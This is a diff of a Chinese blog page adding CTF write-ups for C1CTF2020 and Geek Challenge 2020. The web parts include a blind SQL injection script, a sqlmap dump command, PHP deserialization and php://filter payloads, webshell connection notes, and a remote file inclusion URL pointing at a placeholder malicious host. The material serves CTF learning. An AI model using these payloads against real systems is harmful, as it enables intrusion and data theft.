@@ -64,6 +64,210 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-C1CTF2020-WP" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/12/05/C1CTF2020-WP/" class="article-date">
+  <time datetime="2020-12-05T08:06:12.283Z" itemprop="datePublished">2020-12-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/12/05/C1CTF2020-WP/">C1CTF2020-题解</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>通过这次比赛深深感受到了自己的菜。。。最后打了个第四，比去年50+好很多不过还是二等奖2333。web感觉像是瓶颈了，还是需要努力学啊。这次比赛最大的收获应该是彻底搞懂了盲注。</p>
+<p>这里先说一下盲注。<a target="_blank" rel="noopener" href="https://anemone.top/sqli-SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">参考网站</a></p>
+<p>以make_big_news为例，脚本如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#coding&#x3D;UTF-8</span><br><span class="line">import requests</span><br><span class="line">result &#x3D; &#39;&#39;</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;42.192.184.223:25565&#x2F;?&#39;</span><br><span class="line">ch&#x3D;&#39;0123456789qwertyuiopasdfghjklzxcvbnm_QAZXSWEDCVFRTGBNHYUJMKIOLP&#39;</span><br><span class="line">for i in range(0,50):</span><br><span class="line">    print(str(i)+&quot;号位就绪&quot;)</span><br><span class="line">    for j in ch:</span><br><span class="line">        #payload&#x3D;f&quot;id&#x3D;-1 union select 997,if(substring(database(),%d,1)&#x3D;&#39;%c&#39;,998,999)&quot;%(i,j)</span><br><span class="line">        #上面的用998和999做成功和失败的标志，实际上我也不知道为啥这里两个字段都是数字就可以回显出数字，有一个是字母就是空白QAQ，所以其实这个payload没有普适性，下面那个比较有参考意义</span><br><span class="line">        </span><br><span class="line">        payload&#x3D;f&quot;id&#x3D;0 or if (substring((select database()),&#123;i&#125;,1)&#x3D;\&#39;&#123;j&#125;\&#39;,1,0)&quot;</span><br><span class="line">        zz &#x3D; requests.get(url+payload)</span><br><span class="line">    </span><br><span class="line">        if &#39;特朗普&#39; in zz.text:</span><br><span class="line">            result &#x3D;result+chr(j)</span><br><span class="line">            print(result)</span><br><span class="line">            print(i)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<p>可以说，注入首先第一步，判断是数字型的还是字符型的。其次，就是按步骤来了。</p>
+<p>如果发现没有办法直接回显出我们想要的数据，就要利用盲注。</p>
+<p>布尔盲注的一个条件就是，页面是否正常显示是有明确条件的。也就是说，我们可以通过控制参数来控制页面能不能返回正常内容。</p>
+<p>以这个题为例，我们先判断是数字型注入，然后知道id那里实际上有两个字段。我们自己根据布尔盲注操控id是否返回1，最后就可以得到database()。以此类推也可以得到表名，列名，数据段。</p>
+<p>时间盲注也是类似的思路，只不过是以时间作为判断依据。</p>
+<p>PS：这个题没法这么做的原因是这个题没设database()，只有一个表news。。。真的就是硬猜QAQ</p>
+<p><strong>WEB</strong></p>
+<p>1.web1:php_tricks[简单]</p>
+<p>构造payload:<code>data=O:7:&quot;Trigger&quot;:2:&#123;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:3:&quot;key&quot;;s:53:&quot;data://text/plain;base64,d2VsY29tZV90b19jMWN0ZjIwMjA=&quot;;&#125;</code>,post传上去得到源码的base64形式，decode一下就得到flag</p>
+<p>PS:”d2VsY29tZV90b19jMWN0ZjIwMjA=”=base64-encode(“welcome_to_c1ctf2020”)</p>
+<p>2.web2:What you see is not true</p>
+<p>发现源码中“点我进入下一步”实际的地址是“./e694aa37abf20c91a442da4841aeccdf.php”，访问一下，发现有一个状态码为302的请求，发现flag就在响应头里</p>
+<p>3.web3:webshell</p>
+<p>url解码就是密码，直接蚁剑链接，根目录下面就有flag</p>
+<p>4.web4:make_big_news</p>
+<p>这道题我要吐了，不知道为什么，感觉很像bool盲注但是就是注不进去(之后知道了根本没设database()/2333）。之后用sqlmap</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http:&#x2F;&#x2F;42.192.184.223:25565&#x2F;?id&#x3D;1 --user-agent&#x3D;&quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko&#x2F;20100101 Firefox&#x2F;83.0&quot; -D news -T admin --dump</span><br></pre></td></tr></table></figure>
+
+<p>然后能得到账号密码，登录进去就有flag</p>
+<p>*web5:php_tricks’ revenge</p>
+<p>考察点：PHP反序列化, PROCFS</p>
+<p> 主要难点在要想到 procfs, fopen 打开后会在 /proc/self/fd/ 下生成一个文件, 且是数字, 按顺序爆破就能得到之前 fopen 的文件poc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class File&#123;</span><br><span class="line">private $file;</span><br><span class="line">function__get($prop) &#123;</span><br><span class="line">$this-&gt;file &#x3D; fopen($prop, &quot;r&quot;);</span><br><span class="line">return$this-&gt;file;&#125;</span><br><span class="line">&#125;</span><br><span class="line">class Config&#123;</span><br><span class="line">public $config;</span><br><span class="line">private $handler;</span><br><span class="line">public function setHandler()</span><br><span class="line">&#123;$this-&gt;handler &#x3D; new File();&#125;</span><br><span class="line">&#125;</span><br><span class="line">class Trigger&#123;</span><br><span class="line">public $filename &#x3D; &#39;&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$b &#x3D; new File();</span><br><span class="line">$c &#x3D; new Config();</span><br><span class="line">$c-&gt;config &#x3D; array(&#39;&#x2F;flag&#x2F;flag&#39;&#x3D;&gt;&#39;&#39;);</span><br><span class="line">$c-&gt;setHandler();</span><br><span class="line">$d &#x3D; new Trigger();</span><br><span class="line">$d-&gt;a &#x3D; $c;</span><br><span class="line"></span><br><span class="line">for ($i &#x3D; 0;$i&lt;32;$i++) &#123; </span><br><span class="line">$d-&gt;filename &#x3D; &#39;&#x2F;proc&#x2F;self&#x2F;fd&#x2F;&#39;. $i;</span><br><span class="line">$e &#x3D; urlencode(serialize($d));</span><br><span class="line">system(&#39;curl http:&#x2F;&#x2F;8.136.142.239:30133&#x2F; -d &quot;data&#x3D;&#39;.$e.&#39;&quot;&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>总结：其实就是利用proc/self/fd/调用进程，表面是验证，实际是读flag</p>
+<p><strong>MISC</strong></p>
+<p>5.misc1:flag的痛</p>
+<p>下个音频解析软件就得到flag了</p>
+<p>6.misc2:真.签到</p>
+<p>略</p>
+<p>7.misc3:BehindMe</p>
+<p>直接谷歌ads ntfs，找到一个网页”<a target="_blank" rel="noopener" href="https://veritas501.space/2017/03/04/%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80%20-%20NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/&quot;,%E9%87%8C%E9%9D%A2%E8%BD%AF%E4%BB%B6%E4%B9%9F%E7%BB%99%E5%A5%BD%E4%BA%86%EF%BC%8C%E7%94%A8%E8%BD%AF%E4%BB%B6%E5%BE%97%E5%88%B0%E2%80%9CC:/Users/86183/Desktop/behindme.txt:flag.txt%E2%80%9D%EF%BC%8C%E8%AE%BF%E9%97%AE%E5%B0%B1%E6%9C%89flag">https://veritas501.space/2017/03/04/%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80%20-%20NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/&quot;,里面软件也给好了，用软件得到“C:\Users\86183\Desktop\behindme.txt:flag.txt”，访问就有flag</a></p>
+<p>8.misc4:呜呜呜</p>
+<p>打开压缩包发现有张gif图，binwalk发现图片里隐藏了一个压缩包(其实也可以直接winhex查看233)，gif文件后缀改成zip解压缩，密码直接123456，得到flag</p>
+<p>9.misc5:forever c1</p>
+<p>直接上脚本了</p>
+<p>参考网站：<a target="_blank" rel="noopener" href="https://blog.csdn.net/enlangs/article/details/81778405?utm_medium=distribute.pc_relevant_bbs_down.none-task-blog-baidujs-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant_bbs_down.none-task-blog-baidujs-1.nonecase%E5%92%8Chttps://stackoverflow.com/questions/47202790/python-requests-how-to-specify-port-for-outgoing-traffic?rq=1">https://blog.csdn.net/enlangs/article/details/81778405?utm_medium=distribute.pc_relevant_bbs_down.none-task-blog-baidujs-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant_bbs_down.none-task-blog-baidujs-1.nonecase和https://stackoverflow.com/questions/47202790/python-requests-how-to-specify-port-for-outgoing-traffic?rq=1</a></p>
+<pre><code>from requests.adapters import HTTPAdapter
+from requests.packages.urllib3.poolmanager import PoolManager
+import requests
+class SourcePortAdapter(HTTPAdapter):
+    &quot;&quot;&quot;&quot;Transport adapter&quot; that allows us to set the source port.&quot;&quot;&quot;
+
+from requests.adapters import HTTPAdapter
+from requests.packages.urllib3.poolmanager import PoolManager
+import requests
+class SourcePortAdapter(HTTPAdapter):
+    &quot;&quot;&quot;&quot;Transport adapter&quot; that allows us to set the source port.&quot;&quot;&quot;
+    def __init__(self, port, *args, **kwargs):
+        self.poolmanager = None
+        self._source_port = port
+        super().__init__(*args, **kwargs)
+
+    def init_poolmanager(self, connections, maxsize, block=False, **pool_kwargs):
+        self.poolmanager = PoolManager(
+            num_pools=connections, maxsize=maxsize,
+            block=block, source_address=(&#39;&#39;, self._source_port))
+s = requests.Session()
+s.mount(&#39;http://8.136.142.239:30501/&#39;, SourcePortAdapter(0xc1))
+r=s.get(&#39;http://8.136.142.239:30501/&#39;)
+r.encoding=&#39;utf-8&#39;
+print(r.text)
+
+s = requests.Session()
+s.mount(&#39;http://8.136.142.239:30501/&#39;, SourcePortAdapter(0xc1))
+r=s.get(&#39;http://8.136.142.239:30501/&#39;)
+r.encoding=&#39;utf-8&#39;
+print(r.text)</code></pre>
+<p>脚本跑出来就有flag</p>
+<p>10.misc6:问卷调查</p>
+<p><strong>CRYPTO</strong></p>
+<p>11.cyrpto1:base的千层套路</p>
+<p>根据字符串特征，反复进行base16/32/64的解码，最后得到flag</p>
+<p>12.crypto2:PigIsSoCute:</p>
+<p>下载文件发现文件开头是“data:image/jpg;base64”，一百度就知道了。直接放到浏览器里得到一张猪圈密码的图，解码后再用栅栏密码，尝试很多次后找到一个有意义的字符串就是flag</p>
+<p>13.crypto3:ezrsa:</p>
+<p>直接脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#python3</span><br><span class="line"></span><br><span class="line">## -*- coding: utf-8 -*-#</span><br><span class="line"></span><br><span class="line">import random</span><br><span class="line">from gmpy2 import invert, iroot</span><br><span class="line">import libnum</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def broadcast(n1, n2 ,n3, c1, c2, c3):</span><br><span class="line">    n &#x3D; [n1, n2, n3]</span><br><span class="line">    C &#x3D; [c1, c2, c3]</span><br><span class="line">    N &#x3D; 1</span><br><span class="line">    for i in n:</span><br><span class="line">        N *&#x3D; i</span><br><span class="line"></span><br><span class="line">    Ni &#x3D; []</span><br><span class="line">    for i in n:</span><br><span class="line">        Ni.append(N &#x2F;&#x2F; i)</span><br><span class="line">    </span><br><span class="line">    T &#x3D; []</span><br><span class="line">    for i in range(3):</span><br><span class="line">        T.append(invert(Ni[i], n[i]))</span><br><span class="line">    </span><br><span class="line">    X &#x3D; 0</span><br><span class="line">    for i in range(3):</span><br><span class="line">        X +&#x3D; C[i] * Ni[i] * T[i]</span><br><span class="line">    </span><br><span class="line">    m3 &#x3D; X % N</span><br><span class="line">    m &#x3D; iroot(m3, 3)</span><br><span class="line">    return m[0]</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    e &#x3D; 3</span><br><span class="line">    n1 &#x3D; 25954427034636580488688831489560115961069472666415079273188034049008164292940982483612692501107292736442028702125249540852911969436468068247311640975480854492713351976176525107812421379597665083397176515413434794308159396038186056408397306479209393999454750519928895047459076589767348484006913759151416548823334675582153771760249016389971299782988978062163676178221833040970770232195936409272958856175588744276987268446839438228569198582572605622120469636250653620089140773532878971104036436080460912344807135105729626088120725564796123320176046591333153953156273882667280324378550802455223461937451841750073937989983</span><br><span class="line">    n2&#x3D;28977092400787747945291214910953475539397234633352432488666947740932896707746402087821613046855183575993557568941158781622249869105260289295489171383139731429934283214540710808914967126144590911898223369390321872883938655216721369282084455732783931981613818631966554624868638800456323235693804356430288896569110909336549599272178314914621792570786164871693373909365501287006142071973005860686344874538143943409429678311737686588867879332895264597392666663429379812688533242656808653123802278526421662344107299830146336834937141923350992781402666027186207135144811802279179093695687133335834251524227256015307192667513</span><br><span class="line">    n3&#x3D;24190274092630151926687108793524797704176150214559782896709114566936770947792315485598948092406603301001115324838577933772803761602741194516662266729209957846204581131810722907796267901163277374210255586883616164601148068628640292710177535651254874024209722605833909278514127991673090395029685984076324965718786722675755176835689645547154439390446344335367504783824259324152050501491588000676038321288448646330542896345041295625635250852659692178192868571083100117948063254735996935227555828339364201830194807935109124187509333776751082631706013914267005054512697140686858570500070125114765551217478594770260412263351</span><br><span class="line">    c1 &#x3D; 17539961945253373331398829582415575036612590036028757160772244972941908466194620745487023767352926635453129673400947551800570434953767905902511379295345136570451295489004354977126089417697594812125862100295615892308145313262857527278337604392345816174840378652211171638690235768088513635252024385701456197867071483547776503865408409665095139733362063385643440859866760991522192617240460504557499194128504331507032560630787690799469014901580657128316778018414925198950809650404230359744912206082228624165856464258230573588957481525576839241810430236093217199856740231709797084566663183618816179247665234718539862375401</span><br><span class="line">    c2&#x3D;19539433379216375750218779547809435082376062229344477092200871020606061269432023167855101557680750544416015137722429840602008656509188763841543689135752445081445085769419299442034779615280240976402031241423972293205872765805658756654762675178901338870755503879710815288905412632689902066516703213400579816331631896382153898787960802955572920035926336038746837415149996536394565793517378707048820536682814580494351837890938696637346974833887793018590409840667797035121476421376800944840299969820809315976451914567085976886787797952235847848303316051413592902451221192422759665784806839017636325833553952683415622277952</span><br><span class="line">    c3&#x3D;2918771551109062192743205470533564743530056495509371083790131677186017377366876762293882312559301769357307295816292413881152560132690342974420494635750769296910584532596145872019444918884467672570317268685540399444720264635786588214509564818842868742697904854444519509240580449289880213055809856384077365925988427171564956047955329734920817815060202824430450606090801964935340359511488077057357948109798343529542672715979068275244032300296615263045889742363640538553080156092612057664163330784377800571208069910607577769286608705780510252727167158433741629217121035911007985869067181230135673920332673026493205578621</span><br><span class="line"></span><br><span class="line">    m &#x3D; broadcast(n1, n2 ,n3, c1, c2, c3)</span><br><span class="line">    print(libnum.n2s(int(m)))</span><br><span class="line"></span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>运行秒出结果ORZ</p>
+<p>PS:<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/76228394">这里</a>有很多关于RSA的脚本</p>
+<p><strong>RE</strong></p>
+<p>14.re1:ezpyc</p>
+<p>直接脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	char buffer[512] &#x3D; &quot;&#96;zn pc|or-mxMzbHx~D&#123;~N~&quot;;</span><br><span class="line">	</span><br><span class="line">	for (int i &#x3D; 0; i &lt; strlen(buffer); i++)</span><br><span class="line">	</span><br><span class="line">	&#123;</span><br><span class="line">		int d &#x3D; strlen(buffer) - i;</span><br><span class="line">		buffer[i] &#x3D; buffer[i] ^ d;</span><br><span class="line">		buffer[i] &#x3D; buffer[i] - i;</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	for (int i &#x3D; strlen(buffer)-1; i &gt;&#x3D;0; i--)</span><br><span class="line">	</span><br><span class="line">		cout &lt;&lt; buffer[i];</span><br><span class="line">	</span><br><span class="line">	return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>脚本跑出来是这个<strong>c1c”f””7c_1”_e4””_t0_reve7se}**，我也不知道哪出了问题，有几位好像变成双引号了，不过问题不大，很好猜flag就是</strong>c1ctf{p7c_1s_e4sy_t0_reve7se}**(ps:e4sy还是e4s7我忘了，不过多试试很容易就出来了，毕竟字符串是有含义的)</p>
+<p>可能是tcl，python不会str和int熟练来回转换，写来写去就是得不到flag，最后气的直接用c++写了。到现在我还是不明白，我把res里的数据用winhex读取，然后一字节一字节的逆向为啥不对。希望官方wp能帮帮孩子解释一下/哭。</p>
+<p>这里贴一下我用python写的错误脚本（得出来一群无意义字符串）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;[0x60,0x7A,0x6e,0x20,0x70,0x63,0x7c,0x6f,0x72,0x2d,0x6d,0x78,0xc2,0x94,0xc2,0x90,0x4d,0x7a,0x62,0xc2,0x88,0x48,0x78,0x7e,0x44,0xc2,0x81,0xc2,0x94,0x7b,0xc2,0x89,0x7e,0x4e,0x7e,0x0a]</span><br><span class="line"></span><br><span class="line">for i in range(36):</span><br><span class="line">    p&#x3D;36-i</span><br><span class="line">    q&#x3D;p^a[i]</span><br><span class="line">    t&#x3D;q-i</span><br><span class="line">    if(t&gt;0):</span><br><span class="line">        print(chr(t))</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/12/05/C1CTF2020-WP/" data-id="ckih1njm00000bwv03du6fpdk" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-wp-geekchallenge2020" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/12/02/wp-geekchallenge2020/" class="article-date">
+  <time datetime="2020-12-02T13:24:49.323Z" itemprop="datePublished">2020-12-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/12/02/wp-geekchallenge2020/">wp-geekchallenge2020</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Web部分</p>
+<p>1.朋友的学妹</p>
+<p>直接看前端就好了QAQ</p>
+<p>2.Ezwww</p>
+<p>扫描器扫出来”/<a target="_blank" rel="noopener" href="http://www.zip&quot;得到一个压缩包,打开之后有一个文件&quot;flag!!!!.txt&quot;,但可惜这个是假的flag2333,之后打开index.php/">www.zip&quot;得到一个压缩包，打开之后有一个文件&quot;flag!!!!.txt&quot;，但可惜这个是假的flag2333，之后打开index.php</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line"> &lt;head&gt;</span><br><span class="line">  &lt;title&gt;Lola&#39;s website1.0&lt;&#x2F;title&gt;</span><br><span class="line"> &lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line"> &lt;body&gt;</span><br><span class="line"> &lt;?php echo &#39;&lt;h1&gt;welcome to my website&lt;&#x2F;h1&gt;&#39;; ?&gt;</span><br><span class="line"> &lt;?php echo &#39;&lt;p&gt;i will never forget to backup my website......&lt;&#x2F;p&gt;&#39;; ?&gt;</span><br><span class="line"> &lt;?php echo &#39;&lt;img src&#x3D;&quot;img&#x2F;lola.gif&quot; alt&#x3D;&quot;welcome~&quot;&#x2F;&gt;&#39;; ?&gt;</span><br><span class="line"> &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$key1 &#x3D; $_POST[&#39;a&#39;];</span><br><span class="line">$key2 &#x3D; base64_decode(&#39;c3ljbDB2ZXI&#x3D;&#39;);</span><br><span class="line">if($key1 &#x3D;&#x3D;&#x3D; $key2)</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F;this is a true flag</span><br><span class="line">echo &#39;&lt;p&gt;SYC&#123;xxxxxxxxxxxxxxxxxx&#125;&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>随便找个base64解密网站得到a=’sycl0ver’，post上传a即可。</p>
+<p>3.刘壮的黑页</p>
+<p>进入题目发现什么都没有，看题目猜测考的上传方式，随便get上传一个a，回显出源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;HTML&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$username &#x3D; $_GET[&#39;username&#39;];</span><br><span class="line">$passwd &#x3D; $_POST[&#39;passwd&#39;];</span><br><span class="line">if ($username &#x3D;&#x3D;&#x3D; &#39;admin&#39; &amp;&amp; $passwd &#x3D;&#x3D;&#x3D; &#39;syclover&#39;)</span><br><span class="line">&#123;   echo $flag; &#125;</span><br></pre></td></tr></table></figure>
+
+<p>则分别上传admin和passwd即可。</p>
+<p>4.Welcome</p>
+<p>题目给了hints。</p>
+<p>hints1：In addition to the GET request method, there is  another common request method…   hint2: Try to use burpsuite to do  this challenge</p>
+<p>所以用burpsuite改包，将GET改为POST，网页回显源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">if ($_SERVER[&#39;REQUEST_METHOD&#39;] !&#x3D;&#x3D; &#39;POST&#39;)&#123; </span><br><span class="line">header(&quot;HTTP&#x2F;1.1 405 Method Not Allowed&quot;);</span><br><span class="line">exit();</span><br><span class="line">&#125;  else &#123;    </span><br><span class="line">        if (!isset($_POST[&#39;roam1&#39;]) || !isset($_POST[&#39;roam2&#39;]))&#123;                                           show_source(__FILE__); </span><br><span class="line">        &#125; </span><br><span class="line">        else if ($_POST[&#39;roam1&#39;] !&#x3D;&#x3D; $_POST[&#39;roam2&#39;] &amp;&amp; sha1($_POST[&#39;roam1&#39;]) &#x3D;&#x3D;&#x3D; sha1($_POST[&#39;roam2&#39;]))&#123;</span><br><span class="line">        phpinfo(); &#x2F;&#x2F; collect information from phpinfo!   &#125; &#125; </span><br></pre></td></tr></table></figure>
+
+<p>典型的数组漏洞，将roam1和roam2以数组形式post上传</p>
+<p><code>roam1[]=1&amp;roam2[]=2</code></p>
+<p>回显出phpinfo()</p>
+<p>结果发现在core中有<code>/var/www/html/f1444aagggg.php</code></p>
+<p>然后直接访问<code>http://49.234.224.119:8000/f1444aagggg.php</code>发现是not found，但是样式显然不对劲。查看network在响应头中发现Flag:SYC{w31c0m3_t0_5yc_r0@m_php1}</p>
+<p>5.我是大黑客</p>
+<p>hint说有liuzhuang.php.bak的备份文件，下载发现竟然是一句话木马，直接菜刀走起，在根目录找到Flag:SYC{1iuzHuang_yyd_G0d!}</p>
+<p>6.ezbypass</p>
+<p>一进网页看见</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Please use a GET request to pass in the variables a and b, compare them with strcmp and let strcmp return a value of NULL.</span><br><span class="line"></span><br><span class="line">Note that a and b cannot be equal. </span><br></pre></td></tr></table></figure>
+
+<p>一看到要让结果返回null，直接get上传<code>?a[]=1&amp;b[]=2</code></p>
+<p>然后网页显示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">OKOK,You got the first step.</span><br><span class="line">Please POST a variable c that is not a number to make it equal to 123 </span><br></pre></td></tr></table></figure>
+
+<p>利用php弱类型，直接post上传<code>c=123a</code></p>
+<p>得到Flag:SYC{php_4s_so_funny} </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/12/02/wp-geekchallenge2020/" data-id="ckih1njm80003bwv09zwkajuh" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-文件包含漏洞和php伪协议" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2020/11/19/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%92%8Cphp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="article-date">
@@ -152,7 +356,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>可以构造类似<code>http://www.xxxxxx.com/?filename=http://aaaa/jiaoben.php</code>这样的payload，其中aaaaa/jiaoben.php是一个别的网站的恶意代码</p>
-<p>PS：这里的aaaaa/jiaoben.php挂自己localhost里的脚本是不好使的，因为对于题目的服务器来说，这里localhost是他的本地而不是我的本地，他是找不到我写在本地的恶意脚本的。因此想要让他执行我写的恶意代码，只能写在一个能在互联网上被访问的网页中，或者我能把我写的恶意代码上传到他的服务器</p>
